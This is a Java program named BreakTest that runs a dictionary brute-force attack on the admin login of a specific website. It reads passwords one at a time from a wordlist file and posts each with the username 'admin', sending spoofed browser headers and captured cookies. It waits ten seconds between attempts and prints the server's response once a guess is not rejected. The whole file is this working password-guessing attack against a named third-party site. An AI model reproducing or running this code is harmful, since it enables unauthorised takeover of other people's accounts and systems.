package com.smart.test;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Random;

import com.smart.util.SimpleHttpClient;
import com.smart.util.SleepUtil;

public class BreakTest {

	public static void main(String[] args) throws IOException {
		BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream("F:/project/400W/1pass00.txt")));
		SimpleHttpClient client = new SimpleHttpClient();
		Random random = new Random();
		String line = reader.readLine();
		while(line!=null) {
			System.out.print("PWD: " + line);
			SimpleHttpClient.HttpReq req = new SimpleHttpClient.HttpReq();
			req.setUrl("http://hy.yahui.cc/admin/");
			req.setContent("loginname=admin&loginpwd="+line+"&Submit.x="+random.nextInt(30)+"&Submit.y=" + random.nextInt(30));
			req.addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
			req.addHeader("Accept-Encoding", "gzip, deflate");
			req.addHeader("Accept-Language", "zh-CN,zh;q=0.8");
			req.addHeader("Cache-Control", "no-cache");
			req.addHeader("Content-Type", "application/x-www-form-urlencoded");
			req.addHeader("Cookie", "Hm_lvt_c97ff667b10cfda3436b4e851bdf390c=1505400268; Hm_lpvt_c97ff667b10cfda3436b4e851bdf390c=1505400268; UM_distinctid=15e80d925d62f4-0d3f68732c027d-3a3e5f04-1fa400-15e80d925d7111; CNZZDATA3481479=cnzz_eid%3D2007209943-1505400267-%26ntime%3D1505400267; pgv_pvi=4695109632; pgv_si=s5480753152; 4008858678mid=369_29; USR=a0ma2fqz%090%091505399996%09http%3A%2F%2Fhy.yahui.cc%2Fadmin%2F; 4008858678slid=slid_377_22%7C; 4008858678slid_377_22=1505400339375; 4008858678mh=1505400340370");
			req.addHeader("Proxy-Connection", "keep-alive");
			req.addHeader("Referer", "http://hy.yahui.cc/admin/");
			req.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
			
			SimpleHttpClient.HttpResp res = client.doPost(req);
			System.out.print(" RESPCODE: " + res.getStatusCode());
			String text = res.getContent();
			if(text.indexOf("密码不正确")>0) {
				System.out.println(": BAD PWD");
			}
			else {
				System.out.println("---------------------------------------");
				System.out.println(text);
				System.out.println("---------------------------------------");
				break;
			}
			SleepUtil.sleep(10000L);
			line = reader.readLine();
		}
		reader.close();
		client.close();
		System.out.println("FILE END");
	}

}

